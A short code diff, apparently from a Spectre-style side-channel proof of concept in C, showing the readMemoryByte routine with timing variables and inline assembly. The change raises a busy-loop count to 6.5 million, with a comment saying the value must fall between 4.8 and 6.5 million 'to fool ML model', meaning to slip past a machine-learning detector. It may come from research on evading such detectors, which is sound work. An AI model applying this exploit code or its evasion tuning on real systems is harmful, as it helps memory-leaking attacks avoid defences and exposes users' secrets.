@@ -39,7 +39,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   register uint64_t time1, time2;
   volatile uint8_t * addr;
 
-  for(int x86=0; x86 < 5000000; x86++) {
+  for(int x86=0; x86 < 6500000; x86++) { // To fool ML model this value needs between 6.5M - 4.8M
       __asm__("mov $0x0000000003FCE23A,%r8\n\t"
         "imul $0xD,%r8,%r8\n\t"
         "imul $0xD,%r8,%r8\n\t"
